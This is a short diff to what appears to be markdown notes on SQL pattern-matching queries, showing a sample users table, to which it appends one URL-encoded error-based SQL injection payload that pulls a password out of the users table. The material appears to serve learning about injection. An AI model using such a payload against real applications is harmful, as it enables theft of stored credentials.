@@ -145,3 +145,7 @@ This returns any rows with username ending with the letter n.
 |2|admin|p4ssword|
 
 This returns any rows with a username containing the characters **mi** within them.
+
+
+
+LIMIT+(SELECT+CAST((SELECT+password+FROM+users+LIMIT+1)+AS+int))--%252B
